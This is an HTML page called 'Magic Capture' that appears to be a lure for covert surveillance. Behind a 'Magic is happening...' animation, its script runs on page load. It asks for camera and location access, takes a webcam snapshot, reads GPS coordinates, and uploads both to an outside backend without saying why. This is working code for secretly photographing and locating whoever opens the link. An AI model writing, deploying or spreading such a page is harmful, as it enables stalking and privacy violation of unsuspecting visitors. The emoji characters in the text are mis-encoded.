<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Magic Capture</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: linear-gradient(180deg, #0a0f1f, #101a32);
      color: #f5f5f5;
    }
    h2 {
      margin-bottom: 10px;
    }
    .magic {
      font-size: 22px;
      animation: pop 1s infinite alternate;
    }
    @keyframes pop {
      from { transform: scale(1); color: #a855f7; }
      to { transform: scale(1.2); color: #38bdf8; }
    }
    video {
      display: none;
      width: 100%;
      max-width: 400px;
      border-radius: 8px;
    }
    .status {
      margin-top: 10px;
      font-size: 15px;
    }
  </style>
</head>
<body>
  <h2>‚ú® Magic Capture</h2>
  <div class="magic">üîÆ Magic is happening...</div>
  <video id="video" autoplay playsinline muted></video>
  <div class="status" id="status">Waiting for permission...</div>

  <script>
    const statusEl = document.getElementById("status");
    const video = document.getElementById("video");

    // ‚úÖ Correct backend URL (Render)
    const backendUrl = "https://backend-photo-loaction.onrender.com/upload";

    async function startMagic() {
      try {
        statusEl.innerText = "Requesting camera & location permission...";
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = "block";

        let lat = null, lon = null;
        try {
          const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 4000 });
          });
          lat = pos.coords.latitude;
          lon = pos.coords.longitude;
        } catch {}

        await new Promise(r => setTimeout(r, 1000));

        // Capture frame
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop camera
        stream.getTracks().forEach(t => t.stop());
        video.style.display = "none";
        statusEl.innerText = "Uploading...";

        const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
        const formData = new FormData();
        formData.append("photo", blob, "magic.png");
        if (lat && lon) {
          formData.append("lat", lat);
          formData.append("lon", lon);
        }

        const resp = await fetch(backendUrl, { method: "POST", body: formData });
        const data = await resp.json();

        if (resp.ok) {
          statusEl.innerHTML = `‚úÖ Uploaded Successfully!<br><a href="${data.filePath}" target="_blank">View Photo</a>`;
        } else {
          statusEl.innerText = "‚ùå Upload failed.";
        }
      } catch (err) {
        statusEl.innerText = "‚ö†Ô∏è Error: " + err.message;
        console.error(err);
      }
    }

    startMagic();
  </script>
</body>
</html>
